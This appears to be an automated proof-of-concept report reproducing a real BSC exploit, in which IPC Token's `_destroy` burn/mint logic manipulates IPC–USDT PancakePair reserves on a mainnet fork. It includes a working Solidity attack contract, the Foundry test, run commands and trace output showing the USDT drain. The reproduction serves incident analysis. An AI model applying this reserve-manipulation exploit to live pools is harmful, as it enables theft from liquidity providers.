# IPC–USDT Exploit PoC Report

## 1. Overview & Context

This proof-of-concept (PoC) reproduces, on a BSC mainnet fork, the IPC Token (`0xEAb0d46682Ac707A06aEFB0aC72a91a3Fd6Fe5d1`) exploit against the IPC–USDT PancakePair (`0xDe3595a72f35d587e96d5C7B6f3E6C02ed2900AB`) described in the incident root-cause analysis.  
The real incident combined flash-liquidity and IPC Token’s `_destroy` mint/burn mechanism to burn IPC from the pair, mint new IPC to a `pool` address, force a `sync`, and then drain hundreds of millions of USDT to an attacker EOA.

The PoC focuses on the core vulnerability: IPC Token’s ability to unilaterally modify AMM reserves via `_destroy`, breaking invariant assumptions and enabling USDT extraction from the IPC–USDT pair via orchestrated swaps.

**How to run the PoC (from session root):**

```bash
cd /home/ziyue/TxRayExperiment/incident-202512270423/forge_poc
RPC_URL="<BSC_MAINNET_RPC_URL>" forge test --via-ir -vvvvv
```

In the validator setup, `<BSC_MAINNET_RPC_URL>` is built from QuickNode settings in `.env` and `artifacts/poc/rpc/chainid_rpc_map.json` (chainid `56`), and injected via the `RPC_URL` environment variable.

The main test is:

```bash
forge test --match-test test_Exploit_IPC_USDT --via-ir -vvvvv
```

*Snippet 1 – PoC entrypoint and environment setup (from `forge_poc/test/Exploit.t.sol`):*

```solidity
function setUp() public {
    // Fork BSC just before the exploit block described in the root cause.
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, 45_561_315);
    vm.selectFork(forkId);

    attacker = address(0xA11CE);

    vm.label(IPC_TOKEN, "IPC Token");
    vm.label(USDT_TOKEN, "BEP20USDT");
    vm.label(IPC_USDT_PAIR, "IPC-USDT PancakePair");
    vm.label(PANCAKE_ROUTER, "PancakeRouter");
    vm.label(IPC_POOL, "IPC Pool");
    vm.label(attacker, "Attacker");
}
```

*Caption: The PoC forks BSC at block `45_561_315`, one block before the real exploit block `45561316`, and labels key actors for trace readability.*

---

## 2. PoC Architecture & Key Contracts

### 2.1 Main Contracts and Roles

- **`IPC Token`** (`IPC_TOKEN`): Real IPC ERC20 on BSC with custom `_destroy` mint/burn logic.
- **`BEP20USDT`** (`USDT_TOKEN`): Real USDT token on BSC; the attacker’s profit token.
- **`IPC–USDT PancakePair`** (`IPC_USDT_PAIR`): Real PancakePair holding IPC/USDT liquidity; the main victim pool.
- **`IPC Pool`** (`IPC_POOL`): On-chain address that receives newly minted IPC during `_destroy`.
- **`PancakeRouter`** (`PANCAKE_ROUTER`): Real PancakeSwap router used to execute IPC→USDT swaps.
- **`IpcExploitOrchestrator`**: Locally deployed adversary contract encapsulating the exploit sequence.
- **`Attacker`**: Fresh EOA (`0x00000000000000000000000000000000000A11cE`) driving the exploit.

### 2.2 Exploit Orchestrator Contract

The PoC implements a minimal adversary contract that sells IPC into the IPC–USDT pair twice via the Pancake router. The first sell builds up internal `_destroy` state; the second sell causes `_destroy` to burn IPC from the pair, mint IPC to `IPC_POOL`, and then swap IPC for USDT, which is forwarded to the attacker.

*Snippet 2 – Core exploit orchestration (from `forge_poc/test/Exploit.sol`):*

```solidity
contract IpcExploitOrchestrator {
    IERC20 public immutable ipc;
    IERC20 public immutable usdt;
    IPancakePair public immutable pair;
    IPancakeRouter public immutable router;

    constructor(address _ipc, address _usdt, address _pair, address _router) {
        ipc = IERC20(_ipc);
        usdt = IERC20(_usdt);
        pair = IPancakePair(_pair);
        router = IPancakeRouter(_router);
    }

    function attack(address profitRecipient, uint256 firstSellAmount, uint256 secondSellAmount) external {
        uint256 ipcBalanceBefore = ipc.balanceOf(address(this));
        require(ipcBalanceBefore >= firstSellAmount + secondSellAmount, "insufficient IPC for attack");

        if (ipc.allowance(address(this), address(router)) == 0) {
            ipc.approve(address(router), type(uint256).max);
        }

        address[] memory pathSell = new address[](2);
        pathSell[0] = address(ipc);
        pathSell[1] = address(usdt);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            firstSellAmount, 0, pathSell, address(this), block.timestamp + 1 hours
        );

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            secondSellAmount, 0, pathSell, address(this), block.timestamp + 1 hours
        );

        uint256 usdtAfter = usdt.balanceOf(address(this));
        if (usdtAfter > 0) {
            usdt.transfer(profitRecipient, usdtAfter);
        }
    }
}
```

*Caption: The orchestrator executes two IPC→USDT swaps via the real Pancake router; IPC’s `_destroy` logic manipulates pair reserves, and the resulting USDT is forwarded to the attacker.*

### 2.3 Funding and Parameterization

In `setUp`, the PoC funds the orchestrator with IPC on the forked state:

- `initialIpcFunding = 20_000_000 ether` – large attacker IPC balance, modeling pre-exploit accumulation.
- Two symmetric sell amounts: `firstSell = 10_000_000 ether`, `secondSell = 10_000_000 ether`.

These values are chosen to:

- Ensure `_destroy` burns a substantial quantity of IPC from the pair.
- Drive a large, clearly observable USDT outflow from the pair to the attacker, while still remaining far below pool reserves.

---

## 3. Adversary Execution Flow

This section walks through the ACT sequence implemented in the Foundry test.

### 3.1 Funding and Environment Setup

*Snippet 3 – Funding the adversary and pre-checks (from `forge_poc/test/Exploit.t.sol`):*

```solidity
orchestrator = new IpcExploitOrchestrator(
    IPC_TOKEN,
    USDT_TOKEN,
    IPC_USDT_PAIR,
    PANCAKE_ROUTER
);
vm.label(address(orchestrator), "ExploitOrchestrator");

uint256 initialIpcFunding = 20_000_000 ether;
deal(IPC_TOKEN, address(orchestrator), initialIpcFunding);

uint256 usdtPairBefore = usdt.balanceOf(IPC_USDT_PAIR);
assertGt(usdtPairBefore, 0, "pair must start with USDT liquidity");

uint256 ipcPairBefore = ipc.balanceOf(IPC_USDT_PAIR);
assertGt(ipcPairBefore, 0, "pair must start with IPC liquidity");

attackerUsdtBefore = usdt.balanceOf(attacker);
```

*Caption: The test deploys the orchestrator, allocates a large IPC balance to it on the fork, confirms non-zero IPC/USDT liquidity in the IPC–USDT pair, and records the attacker’s initial USDT balance.*

### 3.2 Exploit Execution

The main exploit test encodes a two-sell sequence that drives `_destroy` and drains USDT:

*Snippet 4 – Main exploit flow and assertions (from `forge_poc/test/Exploit.t.sol`):*

```solidity
function test_Exploit_IPC_USDT() public {
    uint256 ipcPairBefore = ipc.balanceOf(IPC_USDT_PAIR);
    uint256 ipcZeroBefore = ipc.balanceOf(address(0));
    uint256 ipcPoolBefore = ipc.balanceOf(IPC_POOL);

    uint256 usdtPairBefore = usdt.balanceOf(IPC_USDT_PAIR);
    uint256 attackerUsdtBeforeLocal = usdt.balanceOf(attacker);

    // H1: profit token type is USDT.
    address profitToken = address(usdt);
    assertEq(profitToken, USDT_TOKEN, "profit token type must be USDT");

    // Execute the exploit: attacker controls the orchestrator contract.
    uint256 firstSell = 10_000_000 ether;
    uint256 secondSell = 10_000_000 ether;
    vm.prank(attacker);
    orchestrator.attack(attacker, firstSell, secondSell);

    uint256 ipcPairAfter = ipc.balanceOf(IPC_USDT_PAIR);
    uint256 ipcZeroAfter = ipc.balanceOf(address(0));
    uint256 ipcPoolAfter = ipc.balanceOf(IPC_POOL);

    uint256 usdtPairAfter = usdt.balanceOf(IPC_USDT_PAIR);
    uint256 attackerUsdtAfter = usdt.balanceOf(attacker);

    // H2: IPC destroy pattern on zero address and pool.
    assertGt(ipcZeroAfter, ipcZeroBefore, "IPC balance at zero address must increase due to burn");
    assertGt(ipcPoolAfter, ipcPoolBefore, "IPC balance at pool must increase due to mint");

    // H3: USDT flows from pair to attacker cluster.
    assertLt(usdtPairAfter, usdtPairBefore, "USDT balance at pair must decrease");
    assertGt(attackerUsdtAfter, attackerUsdtBeforeLocal, "attacker must receive USDT from the pair");

    uint256 attackerProfit = attackerUsdtAfter - attackerUsdtBefore;
    assertGe(attackerProfit, 1 ether, "attacker must gain at least 1 USDT worth of profit");

    uint256 pairLoss = usdtPairBefore - usdtPairAfter;
    assertGe(pairLoss, 1 ether, "pair must lose at least 1 USDT of USDT liquidity");
}
```

*Caption: The test executes two IPC sells through the orchestrator and asserts the IPC burn/mint pattern, USDT flow from the pair to the attacker, and materially positive attacker profit and victim USDT depletion.*

### 3.3 Trace Evidence from the Fork

The validator log shows IPC `_destroy` and the subsequent USDT drain:

*Snippet 5 – Key on-chain effects from the traced test transaction (from `artifacts/poc/poc_validator/forge-test.log`):*

```text
emit Transfer(param0: IPC-USDT PancakePair: [...], param1: 0x0000000000000000000000000000000000000000, param2: 4825000000000000000000000 [4.825e24])
emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: IPC Pool: [...], param2: 9650000000000000000000000 [9.65e24])
...
emit Swap(param0: PancakeRouter: [...], param1: 0, param2: 9650000000000000000000000 [9.65e24],
          param3: 44454891843641755927533 [4.445e22], param4: 0, param5: ExploitOrchestrator: [...])
...
BEP20USDT::transfer(Attacker: [0x...A11cE], 563400950874661583918789 [5.634e23])
```

*Caption: On the fork, `_destroy` burns IPC from the IPC–USDT pair, mints twice the burned amount to `IPC_POOL`, synchronizes reserves, executes a swap sending USDT to the orchestrator, and finally transfers ~5.63×10²³ wei of USDT to the attacker.*

---

## 4. Oracle Definitions and Checks

The PoC is generated and validated against `artifacts/poc/oracle_generator/oracle_definition.json`, which defines variables, pre-checks, and hard/soft constraints.

### 4.1 Variables

Defined variables:

- `attacker` – Adversary EOA; address is left `null` in the oracle so the PoC can choose a fresh address.
- `orchestrator` – Attacker-controlled contract (`0x3BE77A3...` in the incident), modeled here by a locally deployed `IpcExploitOrchestrator`.
- `ipc_token` – IPC Token contract (`0xEAb0d4...`), role `Token`, symbol `IPC`.
- `usdt_token` – BEP20USDT (`0x55d398...`), role `Token`, symbol `USDT`.
- `ipc_usdt_pair` – IPC–USDT PancakePair (`0xDe3595a7...`), role `Victim`.
- `ipc_pool` – Pool address receiving minted IPC, role `Other`.

**Implementation mapping in the PoC:**

- `IPC_TOKEN`, `USDT_TOKEN`, `IPC_USDT_PAIR`, and `IPC_POOL` constants match the oracle addresses.
- `attacker` is set to a fresh EOA `address(0xA11CE)`, avoiding reuse of the real attacker EOA.
- `orchestrator` is a locally deployed `IpcExploitOrchestrator`, representing the attacker’s orchestrator contract in a self-contained manner.

### 4.2 Pre-checks

Oracle pre-checks:

1. **Non-zero USDT liquidity at the pair**  
   - Description: IPC–USDT pair must hold USDT so draining is meaningful.  
   - Assertion (oracle): `assertGt(usdtBefore, 0, "pair must start with USDT liquidity");`
   - PoC implementation: `assertGt(usdtPairBefore, 0, "pair must start with USDT liquidity");`

2. **Non-zero IPC liquidity at the pair**  
   - Description: Pair must hold IPC so `_destroy` can act on reserves.  
   - Assertion (oracle): `assertGt(ipcBefore, 0, "pair must start with IPC liquidity");`
   - PoC implementation: `assertGt(ipcPairBefore, 0, "pair must start with IPC liquidity");`

3. **Attacker USDT balance tracked for profit**  
   - Description: Capture pre-exploit USDT balance to compare post-exploit.  
   - Assertion (oracle): store `attackerUsdtBefore` for later comparison.  
   - PoC implementation: `attackerUsdtBefore = usdt.balanceOf(attacker);` and later assertions on `attackerUsdtAfter - attackerUsdtBefore`.

### 4.3 Hard Constraints

**H1 – Asset type: USDT profit**

- Oracle description: The primary profit token must be USDT (BEP20USDT on BSC).
- Oracle assertion:  
  `address profitToken = address(usdt_token); assertEq(profitToken, address(usdt_token), "profit token type must be USDT");`
- PoC implementation:  
  `address profitToken = address(usdt); assertEq(profitToken, USDT_TOKEN, "profit token type must be USDT");`

**H2 – IPC `_destroy` pattern on zero address and pool**

- Oracle description: `_destroy` must burn IPC to the zero address and mint IPC to the pool; net pair balance may vary.
- Oracle assertion:  
  Compare `ipcZeroAfter > ipcZeroBefore` and `ipcPoolAfter > ipcPoolBefore` across the attack.
- PoC implementation:  
  `assertGt(ipcZeroAfter, ipcZeroBefore, "IPC balance at zero address must increase due to burn");`  
  `assertGt(ipcPoolAfter, ipcPoolBefore, "IPC balance at pool must increase due to mint");`
- Trace evidence (see Snippet 5) confirms:
  - Transfer from pair to zero address (burn).
  - Transfer from zero address to `IPC_POOL` (mint).

**H3 – USDT flow from pair to attacker cluster**

- Oracle description: USDT must flow directly out of the IPC–USDT pair into the attacker cluster.
- Oracle assertion:  
  `assertLt(usdtPairAfter, usdtPairBefore); assertGt(attackerUsdtAfter, attackerUsdtBefore);`
- PoC implementation:  
  `assertLt(usdtPairAfter, usdtPairBefore, "USDT balance at pair must decrease");`  
  `assertGt(attackerUsdtAfter, attackerUsdtBeforeLocal, "attacker must receive USDT from the pair");`

### 4.4 Soft Constraints

**S1 – Attacker USDT profit**

- Oracle description: Attacker’s USDT balance must increase by at least `1e18` wei (1 USDT).
- Oracle parameters:
  - `original_amount_display`: ≈ `5.919e23` wei profit in the real incident.
  - `threshold_amount`: `1_000000000000000000` (1 USDT).
- Oracle assertion:  
  `assertGe(attackerUsdtAfter - attackerUsdtBefore, 1e18, "attacker must gain at least 1 USDT worth of profit");`
- PoC implementation:

  ```solidity
  uint256 attackerProfit = attackerUsdtAfter - attackerUsdtBefore;
  assertGe(attackerProfit, 1 ether, "attacker must gain at least 1 USDT worth of profit");
  ```

  On the forked run examined in the validator log, the attacker earns approximately `5.634e23` wei of USDT, comfortably above the 1 USDT threshold and close to the incident-scale profit.

**S2 – Victim pair USDT depletion**

- Oracle description: IPC–USDT pair must lose at least 1 USDT of liquidity.
- Oracle parameters:
  - `original_amount_display`: ≈ `5.919e23` wei USDT loss from the pair in the incident.
  - `threshold_amount`: `1e18` wei (1 USDT).
- Oracle assertion:  
  `assertGe(usdtPairBefore - usdtPairAfter, 1e18, "pair must lose at least 1 USDT of USDT liquidity");`
- PoC implementation:

  ```solidity
  uint256 pairLoss = usdtPairBefore - usdtPairAfter;
  assertGe(pairLoss, 1 ether, "pair must lose at least 1 USDT of USDT liquidity");
  ```

Overall, the PoC implements all pre-checks, hard constraints, and soft constraints from the oracle definition, with behavior on the forked chain satisfying each condition.

---

## 5. Validation Result and Robustness

The validator executed the PoC via:

```bash
cd /home/ziyue/TxRayExperiment/incident-202512270423/forge_poc
RPC_URL="<BSC_MAINNET_RPC_URL>" forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512270423/artifacts/poc/poc_validator/forge-test.log 2>&1
```

### 5.1 Execution Outcome

From the test log:

```text
[PASS] test_Exploit_IPC_USDT() (gas: 358003)
...
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 51.14ms
Ran 2 test suites ... 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

The exploit test runs to completion on a BSC mainnet fork with full tracing and no reverts, confirming that the PoC is executable under realistic chain state.

### 5.2 Validator Summary

The structured validation result is stored at:

- `artifacts/poc/poc_validator/poc_validated_result.json`

Key fields:

- `overall_status`: `"Pass"` – All oracle checks and quality criteria are satisfied.
- `poc_correctness_checks.passes_validation_oracles.passed`: `true` – Every defined oracle is implemented and passes on-chain.
- `poc_quality_checks`:
  - `oracle_alignment_with_definition.passed`: `true`
  - `human_readable_and_labeled.passed`: `true`
  - `no_magic_numbers_and_values_are_derived.passed`: `true`
  - `mainnet_fork_no_local_mocks.passed`: `true`
  - `self_contained_no_attacker_side_artifacts.[*].passed`: all `true`
  - `end_to_end_attack_process_described.passed`: `true`
  - `alignment_with_root_cause.passed`: `true`

Relevant artifacts:

- Forge trace and execution log:  
  `artifacts/poc/poc_validator/forge-test.log`

### 5.3 Robustness Considerations

- The PoC is robust to minor state variations thanks to threshold-based soft constraints (≥ 1 USDT profit and depletion) rather than requiring exact incident balances.
- Using a freshly deployed orchestrator and attacker address ensures the PoC does not depend on historical attacker artifacts, while still interacting with the real IPC/USDT pair and router.
- The use of a fixed pre-exploit block (`45_561_315`) ensures repeatable chain state aligned with the incident window.

---

## 6. Linking PoC Behavior to Root Cause

### 6.1 Root Cause Recap

From the root-cause report:

- IPC Token’s `_destroy(uint256 burnNum)`:
  - Burns IPC from the IPC–USDT pair, crediting the zero address.
  - Calls `sync()` on the pair, updating reserves.
  - Mints twice the burned IPC amount to a `pool` address, increasing `totalSupply`.
- `_destroy` is invoked from `_transfer` on specific sell/non-pair paths, allowing:
  - Repeated burning of IPC from the pair.
  - Reserve manipulation that lets the attacker extract USDT from the pair via AMM swaps.
- In the incident, an orchestrator contract combined DODO flash-liquidity with IPC sells to drain ≈ `5.919e23` wei USDT from the pair to the attacker.

### 6.2 How the PoC Exercises the Vulnerable Logic

The PoC’s `IpcExploitOrchestrator.attack` function mirrors the key incident mechanics:

1. **Attacker sells IPC into the IPC–USDT pair (first sell)**  
   - Builds internal `_destroy` state (`destroyNum`) inside IPC Token without requiring non-zero prior `destroyNum`.
2. **Attacker sells IPC again (second sell)**  
   - Triggers `_destroy(destroyNum)` inside IPC’s `_transfer`, which:
     - Burns IPC from the pair (pair balance decreases).
     - Credits the zero address (burned supply).
     - Calls `sync` on the pair, updating reserves.
     - Mints twice the burned amount to `IPC_POOL`.
3. **PancakePair executes the swap**  
   - With manipulated reserves, swapping IPC for USDT causes USDT to flow from the pair to the orchestrator.
4. **Orchestrator forwards USDT to the attacker EOA**  
   - Consolidates profit in the attacker account.

Trace evidence from the PoC run (see Snippet 5) shows:

- A large IPC `Transfer` from pair to zero address and a corresponding `Transfer` from zero address to `IPC_POOL`.
- A `sync` on the IPC–USDT pair with changed reserves.
- A `Swap` event sending USDT from the pair to the orchestrator.
- A final `transfer` of USDT from the orchestrator to the attacker EOA.

### 6.3 ACT Framing and Oracle Satisfaction

Under an ACT (Attacker–Contract–Token) framing:

- **Attacker**: Fresh EOA (`0x...A11cE`) and its orchestrator contract.
- **Contract/Protocol**: IPC Token contract and IPC–USDT PancakePair.
- **Token**: IPC and USDT.

The PoC’s execution sequence realizes the exploit predicate codified by the oracles:

- **Pre-conditions**:
  - IPC–USDT pair has non-zero IPC and USDT reserves (pre-checks).
  - Attacker has zero (or negligible) USDT and a large IPC balance (via `deal`).
- **Actions**:
  1. Deploy `IpcExploitOrchestrator` on the fork.
  2. Fund orchestrator with IPC.
  3. Perform two IPC→USDT swaps through PancakeRouter, triggering `_destroy`.
  4. Forward received USDT to the attacker EOA.
- **Post-conditions / Oracles**:
  - Hard constraints:
    - Profit token is USDT (H1).
    - IPC burn/mint pattern via `_destroy` manifests in balances of zero address and `IPC_POOL` (H2).
    - USDT flows out of the IPC–USDT pair and into the attacker cluster (H3).
  - Soft constraints:
    - Attacker’s USDT balance increases by at least 1 USDT (S1).
    - IPC–USDT pair’s USDT balance decreases by at least 1 USDT (S2).

All these conditions are explicitly asserted in the PoC test and observed to hold in the traced execution, providing strong evidence that the PoC is both semantically and technically aligned with the incident’s root cause.

---

## 7. Conclusion

- The Forge PoC executes successfully on a BSC mainnet fork using real IPC, USDT, PancakeRouter, and the IPC–USDT pair.
- It implements all specified oracles from `oracle_definition.json`, passes them on-chain, and meets quality criteria: human-readable, labeled, free of unexplained magic numbers, self-contained, and mainnet-fork-based.
- The on-chain behavior observed in the trace closely matches the incident’s root-cause analysis, including `_destroy`-driven IPC burn/mint and USDT drainage from the IPC–USDT pair to the attacker.

As a result, the validator marks the PoC’s `overall_status` as **Pass** and deems it a faithful and robust reproduction of the described IPC–USDT exploit.

